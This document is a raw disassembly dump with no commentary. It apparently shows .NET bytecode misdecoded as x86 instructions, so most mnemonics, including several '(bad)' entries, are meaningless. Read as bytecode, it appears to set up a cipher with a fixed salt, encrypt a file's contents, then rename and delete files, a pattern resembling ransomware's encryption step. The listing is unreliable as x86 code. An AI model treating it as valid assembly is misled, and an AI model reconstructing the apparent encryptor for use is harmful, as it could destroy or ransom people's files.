  4025bf:	9a 73 38 00 00 0a 0a 	lcall  $0xa0a,$0x3873
  4025c6:	06                   	push   %es
  4025c7:	25 6f 39 00 00       	and    $0x396f,%eax
  4025cc:	0a 20                	or     (%eax),%ah
  4025ce:	7f ff                	jg     0x4025cf
  4025d0:	ff                   	(bad)
  4025d1:	ff 5f 6f             	lcall  *0x6f(%edi)
  4025d4:	33 00                	xor    (%eax),%eax
  4025d6:	00 0a                	add    %cl,(%edx)
  4025d8:	de 03                	fiadds (%ebx)
  4025da:	26 de 00             	fiadds %es:(%eax)
  4025dd:	02 7b 28             	add    0x28(%ebx),%bh
  4025e0:	00 00                	add    %al,(%eax)
  4025e2:	04 03                	add    $0x3,%al
  4025e4:	9a 28 0b 00 00 06 2a 	lcall  $0x2a06,$0xb28
  4025eb:	00 01                	add    %al,(%ecx)
  4025ed:	10 00                	adc    %al,(%eax)
  4025ef:	00 00                	add    %al,(%eax)
  4025f1:	00 00                	add    %al,(%eax)
  4025f3:	00 22                	add    %ah,(%edx)
  4025f5:	22 00                	and    (%eax),%al
  4025f7:	03 01                	add    (%ecx),%eax
  4025f9:	00 00                	add    %al,(%eax)
  4025fb:	01 1b                	add    %ebx,(%ebx)
  4025fd:	30 04 00             	xor    %al,(%eax,%eax,1)
  402600:	7f 00                	jg     0x402602
  402602:	00 00                	add    %al,(%eax)
  402604:	09 00                	or     %eax,(%eax)
  402606:	00 11                	add    %dl,(%ecx)
  402608:	73 30                	jae    0x40263a
  40260a:	00 00                	add    %al,(%eax)
  40260c:	06                   	push   %es
  40260d:	0b 07                	or     (%edi),%eax
  40260f:	02 7d 24             	add    0x24(%ebp),%bh
  402612:	00 00                	add    %al,(%eax)
  402614:	04 73                	add    $0x73,%al
  402616:	31 00                	xor    %eax,(%eax)
  402618:	00 06                	add    %al,(%esi)
  40261a:	0a 06                	or     (%esi),%al
  40261c:	07                   	pop    %es
  40261d:	7d 25                	jge    0x402644
  40261f:	00 00                	add    %al,(%eax)
  402621:	04 06                	add    $0x6,%al
  402623:	07                   	pop    %es
  402624:	7b 24                	jnp    0x40264a
  402626:	00 00                	add    %al,(%eax)
  402628:	04 28                	add    $0x28,%al
  40262a:	3a 00                	cmp    (%eax),%al
  40262c:	00 0a                	add    %cl,(%edx)
  40262e:	7d 26                	jge    0x402656
  402630:	00 00                	add    %al,(%eax)
  402632:	04 06                	add    $0x6,%al
  402634:	17                   	pop    %ss
  402635:	7d 27                	jge    0x40265e
  402637:	00 00                	add    %al,(%eax)
  402639:	04 16                	add    $0x16,%al
  40263b:	06                   	push   %es
  40263c:	7b 26                	jnp    0x402664
  40263e:	00 00                	add    %al,(%eax)
  402640:	04 8e                	add    $0x8e,%al
  402642:	69 06 fe 06 32 00    	imul   $0x3206fe,(%esi),%eax
  402648:	00 06                	add    %al,(%esi)
  40264a:	73 3b                	jae    0x402687
  40264c:	00 00                	add    %al,(%eax)
  40264e:	0a 28                	or     (%eax),%ch
  402650:	3c 00                	cmp    $0x0,%al
  402652:	00 0a                	add    %cl,(%edx)
  402654:	26 06                	es push %es
  402656:	07                   	pop    %es
  402657:	7b 24                	jnp    0x40267d
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	3d 00 00 0a 7d       	cmp    $0x7d0a0000,%eax
  402662:	28 00                	sub    %al,(%eax)
  402664:	00 04 16             	add    %al,(%esi,%edx,1)
  402667:	06                   	push   %es
  402668:	7b 28                	jnp    0x402692
  40266a:	00 00                	add    %al,(%eax)
  40266c:	04 8e                	add    $0x8e,%al
  40266e:	69 06 fe 06 33 00    	imul   $0x3306fe,(%esi),%eax
  402674:	00 06                	add    %al,(%esi)
  402676:	73 3b                	jae    0x4026b3
  402678:	00 00                	add    %al,(%eax)
  40267a:	0a 28                	or     (%eax),%ch
  40267c:	3c 00                	cmp    $0x0,%al
  40267e:	00 0a                	add    %cl,(%edx)
  402680:	26 de 03             	fiadds %es:(%ebx)
  402683:	26 de 00             	fiadds %es:(%eax)
  402686:	2a 00                	sub    (%eax),%al
  402688:	01 10                	add    %edx,(%eax)
  40268a:	00 00                	add    %al,(%eax)
  40268c:	00 00                	add    %al,(%eax)
  40268e:	0d 00 6e 7b 00       	or     $0x7b6e00,%eax
  402693:	03 20                	add    (%eax),%esp
  402695:	00 00                	add    %al,(%eax)
  402697:	01 13                	add    %edx,(%ebx)
  402699:	30 03                	xor    %al,(%ebx)
  40269b:	00 c6                	add    %al,%dh
  40269d:	00 00                	add    %al,(%eax)
  40269f:	00 0a                	add    %cl,(%edx)
  4026a1:	00 00                	add    %al,(%eax)
  4026a3:	11 02                	adc    %eax,(%edx)
  4026a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026a6:	2d 00 00 0a 10       	sub    $0x100a0000,%eax
  4026ab:	00 1f                	add    %bl,(%edi)
  4026ad:	10 8d 14 00 00 01    	adc    %cl,0x1000014(%ebp)
  4026b3:	0d 09 16 72 ab       	or     $0xab721609,%eax
  4026b8:	00 00                	add    %al,(%eax)
  4026ba:	70 a2                	jo     0x40265e
  4026bc:	09 17                	or     %edx,(%edi)
  4026be:	72 c7                	jb     0x402687
  4026c0:	00 00                	add    %al,(%eax)
  4026c2:	70 a2                	jo     0x402666
  4026c4:	09 18                	or     %ebx,(%eax)
  4026c6:	72 e9                	jb     0x4026b1
  4026c8:	00 00                	add    %al,(%eax)
  4026ca:	70 a2                	jo     0x40266e
  4026cc:	09 19                	or     %ebx,(%ecx)
  4026ce:	72 09                	jb     0x4026d9
  4026d0:	01 00                	add    %eax,(%eax)
  4026d2:	70 a2                	jo     0x402676
  4026d4:	09 1a                	or     %ebx,(%edx)
  4026d6:	72 23                	jb     0x4026fb
  4026d8:	01 00                	add    %eax,(%eax)
  4026da:	70 a2                	jo     0x40267e
  4026dc:	09 1b                	or     %ebx,(%ebx)
  4026de:	72 35                	jb     0x402715
  4026e0:	01 00                	add    %eax,(%eax)
  4026e2:	70 a2                	jo     0x402686
  4026e4:	09 1c 72             	or     %ebx,(%edx,%esi,2)
  4026e7:	23 01                	and    (%ecx),%eax
  4026e9:	00 70 a2             	add    %dh,-0x5e(%eax)
  4026ec:	09 1d 72 4f 01 00    	or     %ebx,0x14f72
  4026f2:	70 a2                	jo     0x402696
  4026f4:	09 1e                	or     %ebx,(%esi)
  4026f6:	72 69                	jb     0x402761
  4026f8:	01 00                	add    %eax,(%eax)
  4026fa:	70 a2                	jo     0x40269e
  4026fc:	09 1f                	or     %ebx,(%edi)
  4026fe:	09 72 7f             	or     %esi,0x7f(%edx)
  402701:	01 00                	add    %eax,(%eax)
  402703:	70 a2                	jo     0x4026a7
  402705:	09 1f                	or     %ebx,(%edi)
  402707:	0a 72 9d             	or     -0x63(%edx),%dh
  40270a:	01 00                	add    %eax,(%eax)
  40270c:	70 a2                	jo     0x4026b0
  40270e:	09 1f                	or     %ebx,(%edi)
  402710:	0b 72 b3             	or     -0x4d(%edx),%esi
  402713:	01 00                	add    %eax,(%eax)
  402715:	70 a2                	jo     0x4026b9
  402717:	09 1f                	or     %ebx,(%edi)
  402719:	0c 72                	or     $0x72,%al
  40271b:	c7 01 00 70 a2 09    	movl   $0x9a27000,(%ecx)
  402721:	1f                   	pop    %ds
  402722:	0d 72 df 01 00       	or     $0x1df72,%eax
  402727:	70 a2                	jo     0x4026cb
  402729:	09 1f                	or     %ebx,(%edi)
  40272b:	0e                   	push   %cs
  40272c:	72 f9                	jb     0x402727
  40272e:	01 00                	add    %eax,(%eax)
  402730:	70 a2                	jo     0x4026d4
  402732:	09 1f                	or     %ebx,(%edi)
  402734:	0f 72                	psrld  $0x72,(bad)
  402736:	13 02                	adc    (%edx),%eax
  402738:	00 70 a2             	add    %dh,-0x5e(%eax)
  40273b:	09 0a                	or     %ecx,(%edx)
  40273d:	06                   	push   %es
  40273e:	13 04 16             	adc    (%esi,%edx,1),%eax
  402741:	13 05 2b 19 11 04    	adc    0x411192b,%eax
  402747:	11 05 9a 0b 02 07    	adc    %eax,0x7020b9a
  40274d:	6f                   	outsl  %ds:(%esi),(%dx)
  40274e:	3e 00 00             	add    %al,%ds:(%eax)
  402751:	0a 2c 04             	or     (%esp,%eax,1),%ch
  402754:	16                   	push   %ss
  402755:	0c de                	or     $0xde,%al
  402757:	10 11                	adc    %dl,(%ecx)
  402759:	05 17 58 13 05       	add    $0x5135817,%eax
  40275e:	11 05 11 04 8e 69    	adc    %eax,0x698e0411
  402764:	32 df                	xor    %bh,%bl
  402766:	17                   	pop    %ss
  402767:	2a 08                	sub    (%eax),%cl
  402769:	2a 00                	sub    (%eax),%al
  40276b:	00 13                	add    %dl,(%ebx)
  40276d:	30 02                	xor    %al,(%edx)
  40276f:	00 49 00             	add    %cl,0x0(%ecx)
  402772:	00 00                	add    %al,(%eax)
  402774:	0b 00                	or     (%eax),%eax
  402776:	00 11                	add    %dl,(%ecx)
  402778:	73 25                	jae    0x40279f
  40277a:	00 00                	add    %al,(%eax)
  40277c:	0a 0a                	or     (%edx),%cl
  40277e:	06                   	push   %es
  40277f:	72 2b                	jb     0x4027ac
  402781:	02 00                	add    (%eax),%al
  402783:	70 6f                	jo     0x4027f4
  402785:	3f                   	aas
  402786:	00 00                	add    %al,(%eax)
  402788:	0a 26                	or     (%esi),%ah
  40278a:	06                   	push   %es
  40278b:	72 7b                	jb     0x402808
  40278d:	02 00                	add    (%eax),%al
  40278f:	70 6f                	jo     0x402800
  402791:	3f                   	aas
  402792:	00 00                	add    %al,(%eax)
  402794:	0a 26                	or     (%esi),%ah
  402796:	06                   	push   %es
  402797:	72 62                	jb     0x4027fb
  402799:	03 00                	add    (%eax),%eax
  40279b:	70 6f                	jo     0x40280c
  40279d:	3f                   	aas
  40279e:	00 00                	add    %al,(%eax)
  4027a0:	0a 26                	or     (%esi),%ah
  4027a2:	06                   	push   %es
  4027a3:	72 9a                	jb     0x40273f
  4027a5:	03 00                	add    (%eax),%eax
  4027a7:	70 6f                	jo     0x402818
  4027a9:	3f                   	aas
  4027aa:	00 00                	add    %al,(%eax)
  4027ac:	0a 26                	or     (%esi),%ah
  4027ae:	06                   	push   %es
  4027af:	72 77                	jb     0x402828
  4027b1:	06                   	push   %es
  4027b2:	00 70 6f             	add    %dh,0x6f(%eax)
  4027b5:	3f                   	aas
  4027b6:	00 00                	add    %al,(%eax)
  4027b8:	0a 26                	or     (%esi),%ah
  4027ba:	06                   	push   %es
  4027bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4027bc:	1b 00                	sbb    (%eax),%eax
  4027be:	00 0a                	add    %cl,(%edx)
  4027c0:	2a 00                	sub    (%eax),%al
  4027c2:	00 00                	add    %al,(%eax)
  4027c4:	13 30                	adc    (%eax),%esi
  4027c6:	04 00                	add    $0x0,%al
  4027c8:	3f                   	aas
  4027c9:	00 00                	add    %al,(%eax)
  4027cb:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4027ce:	00 11                	add    %dl,(%ecx)
  4027d0:	73 25                	jae    0x4027f7
  4027d2:	00 00                	add    %al,(%eax)
  4027d4:	0a 0a                	or     (%edx),%cl
  4027d6:	73 40                	jae    0x402818
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	0a 0b                	or     (%ebx),%cl
  4027dc:	2b 21                	sub    (%ecx),%esp
  4027de:	06                   	push   %es
  4027df:	72 99                	jb     0x40277a
  4027e1:	06                   	push   %es
  4027e2:	00 70 07             	add    %dh,0x7(%eax)
  4027e5:	72 99                	jb     0x402780
  4027e7:	06                   	push   %es
  4027e8:	00 70 6f             	add    %dh,0x6f(%eax)
  4027eb:	1c 00                	sbb    $0x0,%al
  4027ed:	00 0a                	add    %cl,(%edx)
  4027ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4027f0:	41                   	inc    %ecx
  4027f1:	00 00                	add    %al,(%eax)
  4027f3:	0a 6f 27             	or     0x27(%edi),%ch
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	0a 6f 28             	or     0x28(%edi),%ch
  4027fb:	00 00                	add    %al,(%eax)
  4027fd:	0a 26                	or     (%esi),%ah
  4027ff:	16                   	push   %ss
  402800:	02 25 17 59 10 00    	add    0x105917,%ah
  402806:	32 d6                	xor    %dh,%dl
  402808:	06                   	push   %es
  402809:	6f                   	outsl  %ds:(%esi),(%dx)
  40280a:	1b 00                	sbb    (%eax),%eax
  40280c:	00 0a                	add    %cl,(%edx)
  40280e:	2a 00                	sub    (%eax),%al
  402810:	01 02                	add    %eax,(%edx)
  402812:	03 04 05 06 07 08 1b 	add    0x1b080706(,%eax,1),%eax
  402819:	30 04 00             	xor    %al,(%eax,%eax,1)
  40281c:	45                   	inc    %ebp
  40281d:	01 00                	add    %eax,(%eax)
  40281f:	00 0d 00 00 11 02    	add    %cl,0x2110000
  402825:	72 26                	jb     0x40284d
  402827:	07                   	pop    %es
  402828:	00 70 1a             	add    %dh,0x1a(%eax)
  40282b:	28 09                	sub    %cl,(%ecx)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	28 35 00 00 0a 0a    	sub    %dh,0xa0a0000
  402836:	1e                   	push   %ds
  402837:	8d 30                	lea    (%eax),%esi
  402839:	00 00                	add    %al,(%eax)
  40283b:	01 25 d0 2c 00 00    	add    %esp,0x2cd0
  402841:	04 28                	add    $0x28,%al
  402843:	42                   	inc    %edx
  402844:	00 00                	add    %al,(%eax)
  402846:	0a 0b                	or     (%ebx),%cl
  402848:	06                   	push   %es
  402849:	18 73 43             	sbb    %dh,0x43(%ebx)
  40284c:	00 00                	add    %al,(%eax)
  40284e:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402851:	29 00                	sub    %eax,(%eax)
  402853:	00 0a                	add    %cl,(%edx)
  402855:	03 6f 2a             	add    0x2a(%edi),%ebp
  402858:	00 00                	add    %al,(%eax)
  40285a:	0a 0d 73 44 00 00    	or     0x4473,%cl
  402860:	0a 13                	or     (%ebx),%dl
  402862:	04 11                	add    $0x11,%al
  402864:	04 20                	add    $0x20,%al
  402866:	80 00 00             	addb   $0x0,(%eax)
  402869:	00 6f 45             	add    %ch,0x45(%edi)
  40286c:	00 00                	add    %al,(%eax)
  40286e:	0a 11                	or     (%ecx),%dl
  402870:	04 20                	add    $0x20,%al
  402872:	80 00 00             	addb   $0x0,(%eax)
  402875:	00 6f 46             	add    %ch,0x46(%edi)
  402878:	00 00                	add    %al,(%eax)
  40287a:	0a 11                	or     (%ecx),%dl
  40287c:	04 18                	add    $0x18,%al
  40287e:	6f                   	outsl  %ds:(%esi),(%dx)
  40287f:	47                   	inc    %edi
  402880:	00 00                	add    %al,(%eax)
  402882:	0a 09                	or     (%ecx),%cl
  402884:	07                   	pop    %es
  402885:	17                   	pop    %ss
  402886:	73 48                	jae    0x4028d0
  402888:	00 00                	add    %al,(%eax)
  40288a:	0a 13                	or     (%ebx),%dl
  40288c:	05 11 04 11 05       	add    $0x5110411,%eax
  402891:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  402894:	49                   	dec    %ecx
  402895:	00 00                	add    %al,(%eax)
  402897:	0a 1e                	or     (%esi),%bl
  402899:	5b                   	pop    %ebx
  40289a:	6f                   	outsl  %ds:(%esi),(%dx)
  40289b:	4a                   	dec    %edx
  40289c:	00 00                	add    %al,(%eax)
  40289e:	0a 6f 4b             	or     0x4b(%edi),%ch
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	0a 11                	or     (%ecx),%dl
  4028a5:	04 11                	add    $0x11,%al
  4028a7:	05 11 04 6f 4c       	add    $0x4c6f0411,%eax
  4028ac:	00 00                	add    %al,(%eax)
  4028ae:	0a 1e                	or     (%esi),%bl
  4028b0:	5b                   	pop    %ebx
  4028b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4028b2:	4a                   	dec    %edx
  4028b3:	00 00                	add    %al,(%eax)
  4028b5:	0a 6f 4d             	or     0x4d(%edi),%ch
  4028b8:	00 00                	add    %al,(%eax)
  4028ba:	0a 11                	or     (%ecx),%dl
  4028bc:	04 17                	add    $0x17,%al
  4028be:	6f                   	outsl  %ds:(%esi),(%dx)
  4028bf:	4e                   	dec    %esi
  4028c0:	00 00                	add    %al,(%eax)
  4028c2:	0a 08                	or     (%eax),%cl
  4028c4:	07                   	pop    %es
  4028c5:	16                   	push   %ss
  4028c6:	07                   	pop    %es
  4028c7:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4028ca:	4f                   	dec    %edi
  4028cb:	00 00                	add    %al,(%eax)
  4028cd:	0a 08                	or     (%eax),%cl
  4028cf:	11 04 6f             	adc    %eax,(%edi,%ebp,2)
  4028d2:	50                   	push   %eax
  4028d3:	00 00                	add    %al,(%eax)
  4028d5:	0a 17                	or     (%edi),%dl
  4028d7:	73 51                	jae    0x40292a
  4028d9:	00 00                	add    %al,(%eax)
  4028db:	0a 13                	or     (%ebx),%dl
  4028dd:	06                   	push   %es
  4028de:	02 19                	add    (%ecx),%bl
  4028e0:	73 43                	jae    0x402925
  4028e2:	00 00                	add    %al,(%eax)
  4028e4:	0a 13                	or     (%ebx),%dl
  4028e6:	07                   	pop    %es
  4028e7:	11 07                	adc    %eax,(%edi)
  4028e9:	11 06                	adc    %eax,(%esi)
  4028eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4028ec:	52                   	push   %edx
  4028ed:	00 00                	add    %al,(%eax)
  4028ef:	0a 11                	or     (%ecx),%dl
  4028f1:	07                   	pop    %es
  4028f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4028f3:	53                   	push   %ebx
  4028f4:	00 00                	add    %al,(%eax)
  4028f6:	0a 11                	or     (%ecx),%dl
  4028f8:	07                   	pop    %es
  4028f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4028fa:	54                   	push   %esp
  4028fb:	00 00                	add    %al,(%eax)
  4028fd:	0a 11                	or     (%ecx),%dl
  4028ff:	06                   	push   %es
  402900:	6f                   	outsl  %ds:(%esi),(%dx)
  402901:	53                   	push   %ebx
  402902:	00 00                	add    %al,(%eax)
  402904:	0a 11                	or     (%ecx),%dl
  402906:	06                   	push   %es
  402907:	6f                   	outsl  %ds:(%esi),(%dx)
  402908:	54                   	push   %esp
  402909:	00 00                	add    %al,(%eax)
  40290b:	0a 08                	or     (%eax),%cl
  40290d:	6f                   	outsl  %ds:(%esi),(%dx)
  40290e:	54                   	push   %esp
  40290f:	00 00                	add    %al,(%eax)
  402911:	0a 06                	or     (%esi),%al
  402913:	1c 18                	sbb    $0x18,%al
  402915:	73 55                	jae    0x40296c
  402917:	00 00                	add    %al,(%eax)
  402919:	0a 13                	or     (%ebx),%dl
  40291b:	08 11                	or     %dl,(%ecx)
  40291d:	08 73 56             	or     %dh,0x56(%ebx)
  402920:	00 00                	add    %al,(%eax)
  402922:	0a 13                	or     (%ebx),%dl
  402924:	09 11                	or     %edx,(%ecx)
  402926:	09 04 6f             	or     %eax,(%edi,%ebp,2)
  402929:	57                   	push   %edi
  40292a:	00 00                	add    %al,(%eax)
  40292c:	0a 11                	or     (%ecx),%dl
  40292e:	09 6f 58             	or     %ebp,0x58(%edi)
  402931:	00 00                	add    %al,(%eax)
  402933:	0a 11                	or     (%ecx),%dl
  402935:	09 6f 59             	or     %ebp,0x59(%edi)
  402938:	00 00                	add    %al,(%eax)
  40293a:	0a de                	or     %dh,%bl
  40293c:	0c 11                	or     $0x11,%al
  40293e:	09 2c 07             	or     %ebp,(%edi,%eax,1)
  402941:	11 09                	adc    %ecx,(%ecx)
  402943:	6f                   	outsl  %ds:(%esi),(%dx)
  402944:	1d 00 00 0a dc       	sbb    $0xdc0a0000,%eax
  402949:	de 0c 11             	fimuls (%ecx,%edx,1)
  40294c:	08 2c 07             	or     %ch,(%edi,%eax,1)
  40294f:	11 08                	adc    %ecx,(%eax)
  402951:	6f                   	outsl  %ds:(%esi),(%dx)
  402952:	1d 00 00 0a dc       	sbb    $0xdc0a0000,%eax
  402957:	02 72 2a             	add    0x2a(%edx),%dh
  40295a:	07                   	pop    %es
  40295b:	00 70 28             	add    %dh,0x28(%eax)
  40295e:	5a                   	pop    %edx
  40295f:	00 00                	add    %al,(%eax)
  402961:	0a 02                	or     (%edx),%al
  402963:	28 5b 00             	sub    %bl,0x0(%ebx)
  402966:	00 0a                	add    %cl,(%edx)
  402968:	2a 00                	sub    (%eax),%al
  40296a:	00 00                	add    %al,(%eax)
  40296c:	01 1c 00             	add    %ebx,(%eax,%eax,1)
  40296f:	00 02                	add    %al,(%edx)
  402971:	00 01                	add    %al,(%ecx)
  402973:	01 18                	add    %ebx,(%eax)
  402975:	19 01                	sbb    %eax,(%ecx)
  402977:	0c 00                	or     $0x0,%al
  402979:	00 00                	add    %al,(%eax)
  40297b:	00 02                	add    %al,(%edx)
  40297d:	00 f8                	add    %bh,%al
  40297f:	00 2f                	add    %ch,(%edi)
  402981:	27                   	daa
  402982:	01 0c 00             	add    %ecx,(%eax,%eax,1)
  402985:	00 00                	add    %al,(%eax)
  402987:	00 1b                	add    %bl,(%ebx)
  402989:	30 04 00             	xor    %al,(%eax,%eax,1)
  40298c:	45                   	inc    %ebp
  40298d:	00 00                	add    %al,(%eax)
  40298f:	00 0e                	add    %cl,(%esi)
  402991:	00 00                	add    %al,(%eax)
  402993:	11 28                	adc    %ebp,(%eax)
  402995:	11 00                	adc    %eax,(%eax)
  402997:	00 06                	add    %al,(%esi)
  402999:	26 02 72 26          	add    %es:0x26(%edx),%dh
  40299d:	07                   	pop    %es
  40299e:	00 70 1a             	add    %dh,0x1a(%eax)
  4029a1:	28 09                	sub    %cl,(%ecx)
  4029a3:	00 00                	add    %al,(%eax)
  4029a5:	06                   	push   %es
  4029a6:	28 35 00 00 0a 18    	sub    %dh,0x180a0000
  4029ac:	18 16                	sbb    %dl,(%esi)
  4029ae:	73 5c                	jae    0x402a0c
  4029b0:	00 00                	add    %al,(%eax)
  4029b2:	0a 0a                	or     (%edx),%cl
  4029b4:	06                   	push   %es
  4029b5:	04 6f                	add    $0x6f,%al
  4029b7:	5d                   	pop    %ebp
  4029b8:	00 00                	add    %al,(%eax)
  4029ba:	0a 02                	or     (%edx),%al
  4029bc:	72 2a                	jb     0x4029e8
  4029be:	07                   	pop    %es
  4029bf:	00 70 28             	add    %dh,0x28(%eax)
  4029c2:	5a                   	pop    %edx
  4029c3:	00 00                	add    %al,(%eax)
  4029c5:	0a 02                	or     (%edx),%al
  4029c7:	28 5b 00             	sub    %bl,0x0(%ebx)
  4029ca:	00 0a                	add    %cl,(%edx)
  4029cc:	de 0a                	fimuls (%edx)
  4029ce:	06                   	push   %es
  4029cf:	2c 06                	sub    $0x6,%al
  4029d1:	06                   	push   %es
  4029d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4029d3:	1d 00 00 0a dc       	sbb    $0xdc0a0000,%eax
  4029d8:	2a 00                	sub    (%eax),%al
  4029da:	00 00                	add    %al,(%eax)
  4029dc:	01 10                	add    %edx,(%eax)
  4029de:	00 00                	add    %al,(%eax)
  4029e0:	02 00                	add    (%eax),%al
  4029e2:	20 00                	and    %al,(%eax)
  4029e4:	1a 3a                	sbb    (%edx),%bh
  4029e6:	00 0a                	add    %cl,(%edx)
  4029e8:	00 00                	add    %al,(%eax)
  4029ea:	00 00                	add    %al,(%eax)
  4029ec:	1b 30                	sbb    (%eax),%esi
  4029ee:	02 00                	add    (%eax),%al
  4029f0:	30 00                	xor    %al,(%eax)
  4029f2:	00 00                	add    %al,(%eax)
  4029f4:	0f 00 00             	sldt   (%eax)
  4029f7:	11 1f                	adc    %ebx,(%edi)
  4029f9:	20 8d 30 00 00 01    	and    %cl,0x1000030(%ebp)
  4029ff:	0a 73 5e             	or     0x5e(%ebx),%dh
  402a02:	00 00                	add    %al,(%eax)
  402a04:	0a 0b                	or     (%ebx),%cl
  402a06:	16                   	push   %ss
  402a07:	0c 2b                	or     $0x2b,%al
  402a09:	0b 07                	or     (%edi),%eax
  402a0b:	06                   	push   %es
  402a0c:	6f                   	outsl  %ds:(%esi),(%dx)
  402a0d:	5f                   	pop    %edi
  402a0e:	00 00                	add    %al,(%eax)
  402a10:	0a 08                	or     (%eax),%cl
  402a12:	17                   	pop    %ss
  402a13:	58                   	pop    %eax
  402a14:	0c 08                	or     $0x8,%al
  402a16:	1f                   	pop    %ds
  402a17:	0a 32                	or     (%edx),%dh
  402a19:	f0 de 0a             	lock fimuls (%edx)
  402a1c:	07                   	pop    %es
  402a1d:	2c 06                	sub    $0x6,%al
  402a1f:	07                   	pop    %es
  402a20:	6f                   	outsl  %ds:(%esi),(%dx)
  402a21:	1d 00 00 0a dc       	sbb    $0xdc0a0000,%eax
  402a26:	06                   	push   %es
  402a27:	2a 01                	sub    (%ecx),%al
  402a29:	10 00                	adc    %al,(%eax)
  402a2b:	00 02                	add    %al,(%edx)
  402a2d:	00 0e                	add    %cl,(%esi)
  402a2f:	00 16                	add    %dl,(%esi)
  402a31:	24 00                	and    $0x0,%al
  402a33:	0a 00                	or     (%eax),%al
  402a35:	00 00                	add    %al,(%eax)
  402a37:	00 1b                	add    %bl,(%ebx)
  402a39:	30 03                	xor    %al,(%ebx)
  402a3b:	00 4d 00             	add    %cl,0x0(%ebp)
  402a3e:	00 00                	add    %al,(%eax)
  402a40:	10 00                	adc    %al,(%eax)
  402a42:	00 11                	add    %dl,(%ecx)
  402a44:	28 29                	sub    %ch,(%ecx)
  402a46:	00 00                	add    %al,(%eax)
  402a48:	0a 02                	or     (%edx),%al
  402a4a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4b:	2a 00                	sub    (%eax),%al
  402a4d:	00 0a                	add    %cl,(%edx)
  402a4f:	0a 20                	or     (%eax),%ah
  402a51:	00 08                	add    %cl,(%eax)
  402a53:	00 00                	add    %al,(%eax)
  402a55:	73 60                	jae    0x402ab7
  402a57:	00 00                	add    %al,(%eax)
  402a59:	0a 0b                	or     (%ebx),%cl
  402a5b:	07                   	pop    %es
  402a5c:	03 6f 1b             	add    0x1b(%edi),%ebp
  402a5f:	00 00                	add    %al,(%eax)
  402a61:	0a 6f 61             	or     0x61(%edi),%ch
  402a64:	00 00                	add    %al,(%eax)
  402a66:	0a 07                	or     (%edi),%al
  402a68:	06                   	push   %es
  402a69:	17                   	pop    %ss
  402a6a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a6b:	62 00                	bound  %eax,(%eax)
  402a6d:	00 0a                	add    %cl,(%edx)
  402a6f:	0c 08                	or     $0x8,%al
  402a71:	28 2b                	sub    %ch,(%ebx)
  402a73:	00 00                	add    %al,(%eax)
  402a75:	0a 0d 09 13 04 de    	or     0xde041309,%cl
  402a7b:	12 07                	adc    (%edi),%al
  402a7d:	16                   	push   %ss
  402a7e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a7f:	63 00                	arpl   %eax,(%eax)
  402a81:	00 0a                	add    %cl,(%edx)
  402a83:	dc 07                	faddl  (%edi)
  402a85:	2c 06                	sub    $0x6,%al
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	1d 00 00 0a dc       	sbb    $0xdc0a0000,%eax
  402a8e:	11 04 2a             	adc    %eax,(%edx,%ebp,1)
  402a91:	00 00                	add    %al,(%eax)
  402a93:	00 01                	add    %al,(%ecx)
  402a95:	1c 00                	sbb    $0x0,%al
  402a97:	00 02                	add    %al,(%edx)
  402a99:	00 17                	add    %dl,(%edi)
  402a9b:	00 21                	add    %ah,(%ecx)
  402a9d:	38 00                	cmp    %al,(%eax)
  402a9f:	08 00                	or     %al,(%eax)
  402aa1:	00 00                	add    %al,(%eax)
  402aa3:	00 02                	add    %al,(%edx)
  402aa5:	00 17                	add    %dl,(%edi)
  402aa7:	00 29                	add    %ch,(%ecx)
  402aa9:	40                   	inc    %eax
  402aaa:	00 0a                	add    %cl,(%edx)
  402aac:	00 00                	add    %al,(%eax)
  402aae:	00 00                	add    %al,(%eax)
  402ab0:	1e                   	push   %ds
  402ab1:	02 28                	add    (%eax),%ch
  402ab3:	2c 00                	sub    $0x0,%al
  402ab5:	00 0a                	add    %cl,(%edx)
  402ab7:	2a 36                	sub    (%esi),%dh
  402ab9:	03 02                	add    (%edx),%eax
  402abb:	7b 2d                	jnp    0x402aea
  402abd:	00 00                	add    %al,(%eax)
  402abf:	04 28                	add    $0x28,%al
  402ac1:	0f 00 00             	sldt   (%eax)
  402ac4:	0a 2a                	or     (%edx),%ch
  402ac6:	00 00                	add    %al,(%eax)
  402ac8:	13 30                	adc    (%eax),%esi
  402aca:	03 00                	add    (%eax),%eax
  402acc:	22 01                	and    (%ecx),%al
  402ace:	00 00                	add    %al,(%eax)
  402ad0:	11 00                	adc    %eax,(%eax)
  402ad2:	00 11                	add    %dl,(%ecx)
  402ad4:	28 64 00 00          	sub    %ah,0x0(%eax,%eax,1)
  402ad8:	0a 13                	or     (%ebx),%dl
  402ada:	07                   	pop    %es
  402adb:	16                   	push   %ss
  402adc:	13 08                	adc    (%eax),%ecx
  402ade:	38 07                	cmp    %al,(%edi)
  402ae0:	01 00                	add    %eax,(%eax)
  402ae2:	00 11                	add    %dl,(%ecx)
  402ae4:	07                   	pop    %es
  402ae5:	11 08                	adc    %ecx,(%eax)
  402ae7:	9a 0a 28 65 00 00 0a 	lcall  $0xa00,$0x65280a
  402aee:	28 66 00             	sub    %ah,0x0(%esi)
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	0b 06                	or     (%esi),%eax
  402af5:	6f                   	outsl  %ds:(%esi),(%dx)
  402af6:	1b 00                	sbb    (%eax),%eax
  402af8:	00 0a                	add    %cl,(%edx)
  402afa:	07                   	pop    %es
  402afb:	28 0f                	sub    %cl,(%edi)
  402afd:	00 00                	add    %al,(%eax)
  402aff:	0a 39                	or     (%ecx),%bh
